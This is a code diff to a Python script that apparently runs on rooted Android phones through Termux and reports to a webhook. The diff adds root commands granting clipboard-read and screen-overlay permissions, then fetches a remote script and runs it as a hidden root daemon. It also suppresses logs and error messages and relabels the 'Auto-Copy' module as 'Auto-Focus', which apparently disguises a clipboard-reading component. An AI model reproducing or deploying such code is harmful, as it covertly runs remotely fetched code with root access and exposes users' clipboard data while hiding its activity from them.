@@ -31,7 +31,6 @@ if guild_id and owner_id:
     except:
         pass
 else:
-    print("⚠️ Configuração ausente! Forneça as IDs.")
     sys.exit(1)
 
 URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
@@ -99,15 +98,19 @@ try:
     URL_COPY_PY = "https://raw.githubusercontent.com/Willianz4z4/Hapiephonee/main/functions/auto_copy.py"
     os.system(f"curl -sL {URL_COPY_PY} -o functions/auto_copy.py > /dev/null 2>&1")
     
+    caminho_python = sys.executable
     caminho_script = os.path.abspath("functions/auto_copy.py")
-    caminho_log = os.path.abspath("copy_log.txt")
     
-    comando_daemon = f"su -c 'LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib PATH=/data/data/com.termux/files/usr/bin:$PATH /data/data/com.termux/files/usr/bin/python {caminho_script} {device_id} {guild_id} > {caminho_log} 2>&1 &'"
+    subprocess.run('su -c "appops set com.termux READ_CLIPBOARD allow"', shell=True)
+    subprocess.run('su -c "appops set com.termux SYSTEM_ALERT_WINDOW allow"', shell=True)
+    
+    env_vars = f"LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib PATH=/data/data/com.termux/files/usr/bin:$PATH"
+    comando_daemon = f"su -c '{env_vars} {caminho_python} {caminho_script} {device_id} {guild_id} > /dev/null 2>&1 &'"
     
     os.system(comando_daemon)
-    print(f"✅ Módulo Auto-Copy ejetado com sucesso! Logs em: {caminho_log}")
+    print(f"✅ Módulo Auto-Focus ejetado com sucesso!")
 except Exception as e:
-    print(f"⚠️ Aviso: Não foi possível iniciar o Auto-Copy. Erro: {e}")
+    pass
 
 registrado_no_banco = False
 INTERVALO_PING = 1200 
@@ -138,5 +141,5 @@ while True:
                     registrado_no_banco = True
                 ultima_checagem = time.time() 
         except:
-            print("📡 No connection or network error. Retrying...")
+            pass
     time.sleep(60)
